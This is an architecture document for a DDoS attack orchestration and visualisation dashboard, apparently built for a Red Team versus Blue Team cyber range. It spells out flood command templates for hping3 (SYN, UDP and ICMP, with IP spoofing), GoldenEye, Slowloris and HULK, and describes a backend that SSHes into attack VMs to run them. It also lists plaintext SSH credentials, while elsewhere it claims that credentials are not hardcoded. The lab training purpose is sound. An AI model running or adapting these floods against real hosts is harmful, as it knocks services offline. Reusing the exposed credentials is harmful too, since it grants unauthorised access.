# DDoS Attack Visualization Dashboard - System Architecture

## 📋 Overview
A comprehensive distributed DDoS attack orchestration and visualization platform that enables real-time coordination of multiple attack vectors across Red Team VMs targeting Blue Team infrastructure with advanced IP spoofing capabilities.

---

## 🏗️ System Architecture Diagram

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                           CLIENT BROWSER (User Interface)                   │
│                                                                              │
│  ┌────────────────────────────────────────────────────────────────────┐    │
│  │                    Next.js 16.1.0 Frontend                          │    │
│  │  ┌──────────────┐  ┌──────────────┐  ┌──────────────────────────┐ │    │
│  │  │ React 19.2.3 │  │  TypeScript 5│  │   Framer Motion 12.23   │ │    │
│  │  │              │  │              │  │   (Animations)           │ │    │
│  │  └──────────────┘  └──────────────┘  └──────────────────────────┘ │    │
│  │                                                                     │    │
│  │  ┌─────────────────────────────────────────────────────────────┐  │    │
│  │  │              UI Component Libraries                         │  │    │
│  │  │  • Radix UI (Dialog, Select, Switch, Tabs, Tooltip, etc.)  │  │    │
│  │  │  • Lucide React (Icons)                                     │  │    │
│  │  │  • Tailwind CSS 4 (Styling)                                │  │    │
│  │  │  • Class Variance Authority (Conditional Styling)          │  │    │
│  │  └─────────────────────────────────────────────────────────────┘  │    │
│  │                                                                     │    │
│  │  ┌─────────────────────────────────────────────────────────────┐  │    │
│  │  │              3D Visualization Libraries                     │  │    │
│  │  │  • Three.js 0.182.0 (3D Graphics Engine)                   │  │    │
│  │  │  • React Three Fiber 9.4.2 (React Renderer for Three.js)  │  │    │
│  │  │  • @react-three/drei 10.7.7 (3D Helpers)                  │  │    │
│  │  └─────────────────────────────────────────────────────────────┘  │    │
│  │                                                                     │    │
│  │  ┌─────────────────────────────────────────────────────────────┐  │    │
│  │  │         Network Visualization Components                    │  │    │
│  │  │  • IsometricAttackMap (3D Isometric View)                  │  │    │
│  │  │  • CyberAttackMap (2D Flow View)                           │  │    │
│  │  │  • NetworkAttackMap (Network Topology)                      │  │    │
│  │  │  • Cytoscape 3.30.4 (Graph Visualization)                  │  │    │
│  │  └─────────────────────────────────────────────────────────────┘  │    │
│  └─────────────────────────────────────────────────────────────────────┘    │
└──────────────────────────────┬───────────────────────────────────────────────┘
                               │
                               │ HTTP/WebSocket (10.72.200.22:8841)
                               │
┌──────────────────────────────▼───────────────────────────────────────────────┐
│                      BACKEND API SERVER (FastAPI)                            │
│                                                                               │
│  ┌─────────────────────────────────────────────────────────────────────┐    │
│  │                    Python 3.x Backend Stack                          │    │
│  │  ┌──────────────┐  ┌──────────────┐  ┌──────────────────────────┐  │    │
│  │  │  FastAPI     │  │  Uvicorn     │  │    Pydantic 2.10.4      │  │    │
│  │  │   0.115.6    │  │   0.34.0     │  │  (Data Validation)      │  │    │
│  │  └──────────────┘  └──────────────┘  └──────────────────────────┘  │    │
│  └─────────────────────────────────────────────────────────────────────┘    │
│                                                                               │
│  ┌─────────────────────────────────────────────────────────────────────┐    │
│  │                   Core Backend Modules                               │    │
│  │                                                                       │    │
│  │  ┌───────────────────────────────────────────────────────────────┐  │    │
│  │  │  AttackOrchestrator                                           │  │    │
│  │  │  • Manages distributed attack coordination                    │  │    │
│  │  │  • Async attack execution across multiple VMs                │  │    │
│  │  │  • Real-time status tracking via WebSocket                   │  │    │
│  │  │  • Attack lifecycle management (start/stop/monitor)          │  │    │
│  │  └───────────────────────────────────────────────────────────────┘  │    │
│  │                                                                       │    │
│  │  ┌───────────────────────────────────────────────────────────────┐  │    │
│  │  │  SSHExecutor (Paramiko 3.5.0)                                │  │    │
│  │  │  • SSH connection management to Red Team VMs                 │  │    │
│  │  │  • Remote command execution                                   │  │    │
│  │  │  • Connection pooling via ThreadPoolExecutor                 │  │    │
│  │  │  • Password/Key-based authentication                          │  │    │
│  │  └───────────────────────────────────────────────────────────────┘  │    │
│  │                                                                       │    │
│  │  ┌───────────────────────────────────────────────────────────────┐  │    │
│  │  │  IPSpoofingUtil (ipaddress, random modules)                  │  │    │
│  │  │  • Random IP generation from CIDR ranges                     │  │    │
│  │  │  • Sequential IP generation from starting address            │  │    │
│  │  │  • Attack command modification for IP spoofing               │  │    │
│  │  │  • Common IP range templates                                 │  │    │
│  │  └───────────────────────────────────────────────────────────────┘  │    │
│  │                                                                       │    │
│  │  ┌───────────────────────────────────────────────────────────────┐  │    │
│  │  │  WebSocket Manager (websockets 14.1)                         │  │    │
│  │  │  • Real-time attack status broadcasting                      │  │    │
│  │  │  • Client connection management                              │  │    │
│  │  │  • Live log streaming                                        │  │    │
│  │  └───────────────────────────────────────────────────────────────┘  │    │
│  └─────────────────────────────────────────────────────────────────────┘    │
│                                                                               │
│  ┌─────────────────────────────────────────────────────────────────────┐    │
│  │                        REST API Endpoints                            │    │
│  │  • POST /api/attacks/execute - Launch distributed attack            │    │
│  │  • POST /api/attacks/{id}/stop - Stop running attack               │    │
│  │  • GET  /api/attacks - List all attacks                            │    │
│  │  • GET  /api/attacks/{id} - Get attack details                     │    │
│  │  • WS   /api/attacks/{id}/ws - WebSocket for real-time updates    │    │
│  │  • POST /api/spoofing/generate - Generate spoofed IPs              │    │
│  │  • GET  /api/spoofing/ranges - Get common IP ranges                │    │
│  │  • GET  /api/vms/red-team - Red Team VM status                    │    │
│  │  • GET  /api/vms/blue-team - Blue Team target status               │    │
│  │  • GET  /api/attack-types - Available attack types                 │    │
│  └─────────────────────────────────────────────────────────────────────┘    │
└───────────────────────────────┬───────────────────────────────────────────────┘
                                │
                                │ SSH (Paramiko) - Port 22
                                │ Credentials: mist / Cyber#Range
                                │
┌───────────────────────────────▼───────────────────────────────────────────────┐
│                         RED TEAM VMs (Attack Sources)                         │
│                                                                                │
│  ┌──────────────────┐  ┌──────────────────┐  ┌──────────────────────────┐   │
│  │ Attack Scheduler │  │ Attack Generator │  │    Red Team GUI          │   │
│  │  10.10.30.30     │  │   10.10.30.50    │  │     10.10.30.40          │   │
│  │                  │  │                  │  │                          │   │
│  │ Role:            │  │ Role:            │  │ Role:                    │   │
│  │ Coordination     │  │ Primary Attacker │  │ C2 Interface             │   │
│  └──────────────────┘  └──────────────────┘  └──────────────────────────┘   │
│                                                                                │
│  ┌──────────────────┐  ┌──────────────────┐                                  │
│  │ Botnet Gen 1     │  │ Botnet Gen 2     │                                  │
│  │ 10.72.200.64     │  │ 10.72.200.65     │                                  │
│  │                  │  │                  │                                  │
│  │ Role:            │  │ Role:            │                                  │
│  │ Distributed      │  │ Distributed      │                                  │
│  │ Attack           │  │ Attack           │                                  │
│  └──────────────────┘  └──────────────────┘                                  │
│                                                                                │
│  ┌────────────────────────────────────────────────────────────────────┐      │
│  │                     DDoS Attack Tools Installed                     │      │
│  │                                                                      │      │
│  │  1. hping3                                                          │      │
│  │     • Layer 3/4 packet crafting tool                               │      │
│  │     • SYN Flood: -S -p {port} --flood --rand-source                │      │
│  │     • UDP Flood: --udp -p {port} --flood --rand-source            │      │
│  │     • ICMP Flood: --icmp --flood                                   │      │
│  │     • IP Spoofing: -a {spoofed_ip}                                │      │
│  │                                                                      │      │
│  │  2. GoldenEye (/opt/GoldenEye)                                     │      │
│  │     • HTTP Flood tool (Layer 7)                                    │      │
│  │     • Python-based HTTP DoS attack                                 │      │
│  │     • Configurable workers and sockets                             │      │
│  │     • Command: python3 goldeneye.py http://{target}:{port}        │      │
│  │                                                                      │      │
│  │  3. Slowloris                                                       │      │
│  │     • Slow HTTP attack (Layer 7)                                   │      │
│  │     • Low-bandwidth DoS via partial HTTP requests                  │      │
│  │     • Command: slowloris -s {sockets} -p {port} {target}          │      │
│  │                                                                      │      │
│  │  4. HULK (/opt/hulk)                                               │      │
│  │     • HTTP Unbearable Load King                                    │      │
│  │     • Advanced HTTP flood with evasion techniques                  │      │
│  │     • Command: python3 hulk.py http://{target}:{port}             │      │
│  │                                                                      │      │
│  │  5. timeout (GNU coreutils)                                        │      │
│  │     • Attack duration control                                       │      │
│  │     • Automatic termination after specified time                   │      │
│  └────────────────────────────────────────────────────────────────────┘      │
└────────────────────────────────┬───────────────────────────────────────────────┘
                                 │
                                 │ DDoS Attack Traffic
                                 │ (TCP SYN, UDP, HTTP, ICMP)
                                 │ With Optional IP Spoofing
                                 │
┌────────────────────────────────▼───────────────────────────────────────────────┐
│                        BLUE TEAM VMs (Attack Targets)                          │
│                                                                                 │
│  ┌──────────────────┐  ┌──────────────────┐  ┌──────────────────────────┐    │
│  │  Blue Team 1     │  │  Blue Team 2     │  │    Blue Team 3           │    │
│  │  20.10.40.11     │  │  20.10.50.11     │  │     20.10.60.11          │    │
│  │                  │  │                  │  │                          │    │
│  │  Target Ports:   │  │  Target Ports:   │  │  Target Ports:           │    │
│  │  • 9080 (bWAPP)  │  │  • 9080 (bWAPP)  │  │  • 9080 (bWAPP)          │    │
│  │  • 9090 (DVWA)   │  │  • 9090 (DVWA)   │  │  • 9090 (DVWA)           │    │
│  │  • 3000 (Custom) │  │  • 3000 (Custom) │  │  • 3000 (Custom)         │    │
│  └──────────────────┘  └──────────────────┘  └──────────────────────────┘    │
│                                                                                 │
│  ┌────────────────────────────────────────────────────────────────────┐       │
│  │                  Vulnerable Web Applications                        │       │
│  │  • bWAPP (Buggy Web Application) - Port 9080                       │       │
│  │  • DVWA (Damn Vulnerable Web App) - Port 9090                      │       │
│  │  • Custom vulnerable services - Port 3000                          │       │
│  └────────────────────────────────────────────────────────────────────┘       │
└─────────────────────────────────────────────────────────────────────────────────┘
```

---

## 🔧 Technology Stack

### **Frontend Stack**
| Technology | Version | Purpose |
|------------|---------|---------|
| **Next.js** | 16.1.0 | React framework with SSR, routing, and optimization |
| **React** | 19.2.3 | UI component library |
| **TypeScript** | 5.x | Type-safe JavaScript |
| **Tailwind CSS** | 4.x | Utility-first CSS framework |
| **Framer Motion** | 12.23.26 | Animation library for smooth UI transitions |
| **Radix UI** | Various | Unstyled, accessible UI components (Dialog, Select, Switch, Tabs, Tooltip, Progress, Label, Slot) |
| **Three.js** | 0.182.0 | 3D graphics rendering engine |
| **React Three Fiber** | 9.4.2 | React renderer for Three.js |
| **@react-three/drei** | 10.7.7 | Helpers and abstractions for React Three Fiber |
| **Lucide React** | 0.562.0 | Icon library |
| **Cytoscape** | 3.30.4 | Graph theory / network visualization |
| **Recharts** | 3.6.0 | Charting library for data visualization |
| **date-fns** | 4.1.0 | Date utility library |
| **class-variance-authority** | 0.7.1 | Conditional CSS class management |
| **clsx** | 2.1.1 | Utility for constructing className strings |
| **tailwind-merge** | 3.4.0 | Merge Tailwind CSS classes |

### **Backend Stack**
| Technology | Version | Purpose |
|------------|---------|---------|
| **FastAPI** | 0.115.6 | Modern, high-performance Python web framework |
| **Uvicorn** | 0.34.0 | Lightning-fast ASGI server |
| **Paramiko** | 3.5.0 | SSH protocol implementation for remote command execution |
| **Pydantic** | 2.10.4 | Data validation using Python type annotations |
| **python-dotenv** | 1.0.1 | Environment variable management |
| **WebSockets** | 14.1 | WebSocket implementation for real-time communication |
| **asyncio** | 3.4.3 | Asynchronous I/O framework |
| **aiofiles** | 24.1.0 | Asynchronous file operations |
| **python-multipart** | 0.0.19 | Multipart form data parsing |
| **ipaddress** | Built-in | IP address manipulation and CIDR parsing |
| **random** | Built-in | Random number/selection generation |
| **logging** | Built-in | Application logging |
| **dataclasses** | Built-in | Data structure creation |
| **ThreadPoolExecutor** | Built-in | Concurrent SSH execution |

### **Attack Tools (Deployed on Red Team VMs)**
| Tool | Type | Layer | Purpose |
|------|------|-------|---------|
| **hping3** | Packet Crafting | L3/L4 | TCP SYN floods, UDP floods, ICMP floods, IP spoofing |
| **GoldenEye** | HTTP DoS | L7 | HTTP GET/POST flood attacks |
| **Slowloris** | Slow Attack | L7 | Slow HTTP header attacks, connection exhaustion |
| **HULK** | HTTP DoS | L7 | HTTP Unbearable Load King with evasion |
| **timeout** | Utility | N/A | Attack duration control |

---

## 🔄 Attack Flow Architecture

### **1. Attack Initiation Flow**
```
User (Browser)
    │
    ├─► Select Attack Type (SYN/UDP/HTTP/ICMP/Slowloris/HULK)
    ├─► Select Source VMs (Multiple Red Team VMs)
    ├─► Select Target (Blue Team VM)
    ├─► Configure Parameters (Port, Duration, Workers, Sockets)
    ├─► Optional: Enable IP Spoofing
    │   ├─► Mode: Random from CIDR range
    │   │   └─► Enter CIDR (e.g., 192.168.1.0/24)
    │   └─► Mode: Sequential from starting IP
    │       └─► Enter starting IP (e.g., 192.168.1.1)
    │       └─► Enter count (e.g., 100 IPs)
    │
    └─► Click "Launch Attack"
         │
         ▼
    POST /api/attacks/execute
         │
         ▼
    Backend AttackOrchestrator
         │
         ├─► Generate Attack ID (UUID)
         ├─► Create AttackExecution Record
         ├─► If IP Spoofing Enabled:
         │   └─► Generate IP List (Random or Sequential)
         │
         └─► Launch Async Tasks (One per Source VM)
              │
              ▼
         SSH to Each Red Team VM (Paramiko)
              │
              ├─► Build Attack Command
              ├─► Apply IP Spoofing (if enabled)
              │   └─► Modify command with -a flag (hping3)
              │
              └─► Execute Command via SSH
                   │
                   ▼
              Attack Tool Execution on VM
                   │
                   ▼
              DDoS Traffic to Blue Team Target
```

### **2. Real-Time Monitoring Flow**
```
Backend Attack Execution
    │
    ├─► WebSocket Connection (/api/attacks/{id}/ws)
    │   │
    │   ├─► Broadcast Attack Start
    │   ├─► Stream Command Output
    │   ├─► Update Attack Status
    │   └─► Broadcast Completion
    │
    ▼
Frontend WebSocket Client
    │
    ├─► Receive Real-Time Updates
    ├─► Update Attack Logs
    ├─► Update VM Status Indicators
    ├─► Animate Attack Flows on Map
    └─► Display Packets Sent/Received
```

### **3. IP Spoofing Architecture**
```
Frontend: IP Spoofing Toggle ON
    │
    ├─► Mode Selection
    │   ├─► Random Mode
    │   │   ├─► Select/Enter CIDR Range (10.0.0.0/8)
    │   │   └─► POST /api/spoofing/generate
    │   │       └─► Backend: IPSpoofingUtil.generate_random_ips()
    │   │           └─► Uses ipaddress.ip_network()
    │   │           └─► random.sample() from hosts
    │   │
    │   └─► Sequential Mode
    │       ├─► Enter Starting IP (192.168.1.1)
    │       ├─► Enter Count (100)
    │       └─► POST /api/spoofing/generate
    │           └─► Backend: IPSpoofingUtil.generate_sequential_ips()
    │               └─► Uses ipaddress.ip_address()
    │               └─► Iterate: start_ip + i
    │
    ├─► Display Generated IPs in UI
    │
    └─► Include in Attack Request
         │
         ▼
    Backend: Modify Attack Commands
         │
         ├─► For hping3: Remove --rand-source
         ├─► Add -a {random_spoofed_ip} flag
         └─► Each packet uses different source IP
```

---

## 📊 Data Flow Diagram

```
┌─────────────┐
│   Browser   │
│   (React)   │
└──────┬──────┘
       │
       │ HTTP POST /api/attacks/execute
       │ {attack_type, source_vms, target_id,
       │  enable_ip_spoofing, spoofed_ips}
       │
       ▼
┌─────────────────────┐
│  FastAPI Backend    │
│  AttackOrchestrator │
└──────┬──────────────┘
       │
       │ For each Source VM:
       │ SSH Connect (Paramiko)
       │
       ▼
┌────────────────────────────────────────┐
│  Red Team VM 1 (10.10.30.30)          │
│  SSH Session                            │
│  Execute: sudo timeout 120 hping3 -S   │
│           -p 9080 -a 192.168.1.5       │
│           --flood 20.10.40.11          │
└──────┬─────────────────────────────────┘
       │
       │ TCP SYN Packets (Spoofed Source: 192.168.1.5)
       │
       ▼
┌────────────────────────────────────────┐
│  Blue Team VM (20.10.40.11)           │
│  Port 9080 (bWAPP)                     │
│  Receives flood of SYN packets         │
│  Cannot identify real attacker         │
└────────────────────────────────────────┘
       │
       │ Connection exhaustion
       │ Resource depletion
       │
       ▼
    [DoS State]
```

---

## 🎯 Attack Types & Command Templates

### **1. SYN Flood**
- **Layer:** L4 (Transport)
- **Tool:** hping3
- **Command:** `sudo timeout {duration} hping3 -S -p {port} --flood --rand-source {target}`
- **With IP Spoofing:** `sudo timeout {duration} hping3 -S -p {port} -a {spoofed_ip} --flood {target}`
- **Mechanism:** Exploits TCP 3-way handshake, sends SYN without completing handshake
- **Impact:** Connection table exhaustion, service unavailability

### **2. UDP Flood**
- **Layer:** L4 (Transport)
- **Tool:** hping3
- **Command:** `sudo timeout {duration} hping3 --udp -p {port} --flood --rand-source {target}`
- **With IP Spoofing:** `sudo timeout {duration} hping3 --udp -p {port} -a {spoofed_ip} --flood {target}`
- **Mechanism:** Sends massive UDP packets to random/specific ports
- **Impact:** Bandwidth saturation, CPU exhaustion

### **3. HTTP Flood (GoldenEye)**
- **Layer:** L7 (Application)
- **Tool:** GoldenEye (Python)
- **Command:** `cd /opt/GoldenEye && timeout {duration} python3 goldeneye.py http://{target}:{port} -w {workers} -s {sockets}`
- **Mechanism:** Multiple threads send HTTP GET/POST requests
- **Impact:** Web server resource exhaustion, application slowdown

### **4. Slowloris**
- **Layer:** L7 (Application)
- **Tool:** Slowloris
- **Command:** `timeout {duration} slowloris -s {sockets} -p {port} {target}`
- **Mechanism:** Opens connections and sends partial HTTP headers slowly
- **Impact:** Connection pool exhaustion, keeps threads busy

### **5. ICMP Flood**
- **Layer:** L3 (Network)
- **Tool:** hping3
- **Command:** `sudo timeout {duration} hping3 --icmp --flood {target}`
- **With IP Spoofing:** `sudo timeout {duration} hping3 --icmp -a {spoofed_ip} --flood {target}`
- **Mechanism:** Sends massive ICMP Echo Request packets
- **Impact:** Network bandwidth saturation, router overload

### **6. HULK**
- **Layer:** L7 (Application)
- **Tool:** HULK (Python)
- **Command:** `cd /opt/hulk && timeout {duration} python3 hulk.py http://{target}:{port}`
- **Mechanism:** Obfuscated HTTP requests with randomized headers
- **Impact:** Bypasses simple rate limiting, application layer exhaustion

---

## 🔐 Security & Authentication

### **SSH Authentication**
- **Method:** Password-based or SSH key
- **Username:** `mist`
- **Password:** `Cyber#Range`
- **Port:** 22
- **Key Path:** Configurable via environment variable

### **API Security**
- **CORS:** Enabled for cross-origin requests
- **Environment Variables:** Managed via `.env` file
- **Credentials:** Not hardcoded, loaded from environment

---

## 🌐 Network Architecture

### **IP Address Scheme**
```
Red Team Network (Attack Sources):
├─ 10.10.30.30 - Attack Scheduler
├─ 10.10.30.40 - Red Team GUI
├─ 10.10.30.50 - Attack Generator
├─ 10.72.200.64 - Botnet Gen 1
└─ 10.72.200.65 - Botnet Gen 2

Blue Team Network (Targets):
├─ 20.10.40.11 - Blue Team 1
├─ 20.10.50.11 - Blue Team 2
└─ 20.10.60.11 - Blue Team 3

API Server:
└─ 10.72.200.22:8841 - FastAPI Backend
```

### **Port Configuration**
- **bWAPP:** 9080
- **DVWA:** 9090
- **Custom Services:** 3000
- **API Backend:** 8841
- **Frontend Dev:** 3000 (Next.js)
- **SSH:** 22

---

## 🚀 Deployment Architecture

### **Frontend Deployment**
```bash
# Development
npm run dev          # Starts Next.js dev server on port 3000

# Production
npm run build        # Creates optimized production build
npm run start        # Starts production server
```

### **Backend Deployment**
```bash
# Development
cd backend
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
python main.py       # Starts Uvicorn server on 0.0.0.0:8841
```

### **Concurrent Deployment**
```bash
npm run dev:all      # Runs both frontend and backend concurrently
```

---

## 📈 Performance & Scalability

### **Concurrency Model**
- **Frontend:** React concurrent rendering
- **Backend:** AsyncIO event loop
- **SSH Execution:** ThreadPoolExecutor (max 10 workers)
- **Attack Coordination:** Async/await with `asyncio.gather()`

### **WebSocket Performance**
- Real-time bidirectional communication
- Automatic reconnection handling
- Connection pooling and management

### **Attack Parallelization**
- Each source VM executes attacks independently
- Concurrent SSH connections via thread pool
- Parallel task execution with error isolation

---

## 🎨 Visualization Features

### **3D Isometric View (IsometricAttackMap)**
- **Technology:** Canvas 2D API with isometric projection
- **Features:**
  - 3D computer blocks (monitor + tower)
  - Animated packet envelopes
  - Material Design 3 color palette
  - DPI scaling for high-resolution displays
  - Real-time packet flow animation

### **2D Cyber Attack Map (CyberAttackMap)**
- **Technology:** Canvas 2D API
- **Features:**
  - Network topology visualization
  - Attack flow arrows
  - Source-to-target packet animation
  - Status indicators

### **Network Topology (NetworkAttackMap)**
- **Technology:** Cytoscape.js
- **Features:**
  - Interactive graph visualization
  - Node dragging and positioning
  - Edge styling for attack flows

---

## 🔄 State Management

### **Frontend State**
- **React useState:** Component-level state
- **useCallback:** Memoized functions
- **useEffect:** Side effects and data fetching
- **useRef:** WebSocket connection persistence

### **Backend State**
- **In-Memory Storage:** Active attacks dictionary
- **Dataclasses:** Structured attack execution records
- **WebSocket Clients:** Active connection tracking

---

## 📝 Logging & Monitoring

### **Backend Logging**
- **Library:** Python logging module
- **Format:** `%(asctime)s - %(levelname)s - %(message)s`
- **Levels:** INFO, ERROR, WARNING
- **Output:** Console and potential file output

### **Frontend Logging**
- **Attack Logs:** Real-time attack activity feed
- **Types:** info, success, error, warning
- **Display:** Scrollable log panel with timestamps

---

## 🛡️ Attack Lifecycle Management

### **States**
1. **Queued:** Attack scheduled but not started
2. **Running:** Attack actively executing
3. **Completed:** Attack finished successfully
4. **Failed:** Attack encountered errors
5. **Stopped:** Attack manually terminated

### **Lifecycle Operations**
- **Launch:** Create attack record → SSH to VMs → Execute commands
- **Monitor:** WebSocket streaming → Status updates → Log collection
- **Stop:** Send stop signal → Kill processes → Update status
- **Cleanup:** Close SSH connections → Release resources

---

## 🎓 Educational Purpose

This system is designed for **cybersecurity education** in controlled environments:
- Red Team vs Blue Team exercises
- DDoS attack demonstration and mitigation training
- Network security awareness
- Incident response practice

**⚠️ Warning:** Use only in authorized, isolated lab environments. Unauthorized DDoS attacks are illegal.

---

## 📚 Additional Resources

### **Documentation References**
- [FastAPI Documentation](https://fastapi.tiangolo.com/)
- [Next.js Documentation](https://nextjs.org/docs)
- [Paramiko Documentation](https://www.paramiko.org/)
- [Three.js Documentation](https://threejs.org/docs/)
- [hping3 Manual](https://tools.kali.org/information-gathering/hping3)

### **Related Tools**
- GoldenEye: Python HTTP DoS tool
- Slowloris: Low-bandwidth DoS tool
- HULK: HTTP Unbearable Load King

---

**Version:** 1.0
**Last Updated:** December 22, 2025
**Status:** Production Ready
